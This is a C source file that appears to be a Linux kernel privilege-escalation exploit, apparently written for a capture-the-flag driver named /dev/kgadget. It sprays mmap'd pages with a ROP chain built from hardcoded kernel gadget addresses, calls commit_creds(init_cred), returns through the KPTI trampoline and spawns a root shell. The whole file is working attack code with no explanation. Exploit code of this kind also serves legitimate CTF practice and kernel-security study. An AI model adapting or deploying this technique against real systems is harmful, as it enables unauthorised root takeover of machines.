#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>

#define COLOR_NONE "\033[0m" //表示清除前面设置的格式
#define RED "\033[1;31;40m" //40表示背景色为黑色, 1 表示高亮
#define BLUE "\033[1;34;40m"
#define GREEN "\033[1;32;40m"
#define YELLOW "\033[1;33;40m"

/*

0xffffffff81488561: add rsp, 0xa8; pop rbx; pop r12; pop rbp; ret; 
0xffffffff810c92e0: T commit_creds
0xffffffff810c9540: T prepare_kernel_cred
0xffffffff81224afc: xor esi, esi; ret;
0xffffffff8108c6f0: pop rdi; ret;
0xffffffff82a6b700 D init_cred;
0xffffffff81c00fb0 T swapgs_restore_regs_and_return_to_usermode
0xffffffff811483d0: pop rsp; ret;
*/
int fd;
unsigned long user_ss, user_cs, user_sp, user_rflags;	
unsigned long target;
unsigned long target1;

void save_state();
void copy_dir();
void back_door();

void back_door()
{
	printf(RED"getshell");
	system("/bin/sh");
}

void copy_dir()
{
	unsigned long *payload;
	unsigned int index = 0;
	payload = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	for (int i = 0; i < 0x1dd; i++)
		payload[index++] = 0xffffffff81488561; //add rsp, 0xa8; pop rbx; pop r12; pop rbp; ret; 
	for (int i = 0; i < 24; i++)
		payload[index++] = 0xffffffff81224afc;
	payload[index++] = 0xffffffff8108c6f0; // pop rdi ret
	payload[index++] = 0xffffffff82a6b700; //init_cred
	payload[index++] = 0xffffffff810c92e0; //commit_creds
	payload[index++] = 0xffffffff81c00fb0 + 0x1b; //swapgs_restore_regs_and_return_to_usermode
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = (unsigned long)back_door;
	payload[index++] = user_cs;
	payload[index++] = user_rflags;
	payload[index++] = user_sp;
	payload[index++] = user_ss;
}

void save_state()
{
	__asm(
		".intel_syntax noprefix;"
		"mov user_ss, ss;"
		"mov user_cs, cs;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	printf(RED"[*]save state\n");
	printf(BLUE"[+]user_ss:0x%lx\n", user_ss);
	printf(BLUE"[+]user_cs:0x%lx\n", user_cs);
	printf(BLUE"[+]user_cs:0x%lx\n", user_sp);
	printf(BLUE"[+]user_rflags:0x%lx\n", user_rflags);
	printf(RED"[*]save finish\n");
}

int main()
{
	save_state();	
	fd = open("/dev/kgadget", O_RDWR);
	for(int i = 0; i < 0x4000; i++)
		copy_dir();
	
	target =  0xffff888000000000 + 0x6000000;
	__asm(
		".intel_syntax noprefix;"
		"mov r15, 0x15151515;"
		"mov r14, 0x14141414;"
		"mov r13, 0x13131313;"
		"mov r12, 0x12121212;"
		"mov r11, 0x11111111;"
		"mov r10, 0x10101010;"
		"mov r9,  0xffffffff811483d0;"
		"mov r8,  target;"
		"mov rax, 0x10;"
		"mov rcx, 0xcccccccc;"
		"mov rdx, target;"
		"mov rsi, 0x1BF52;"
		"mov rdi, fd;"
		"syscall;"
		".att_syntax;"
	);
}
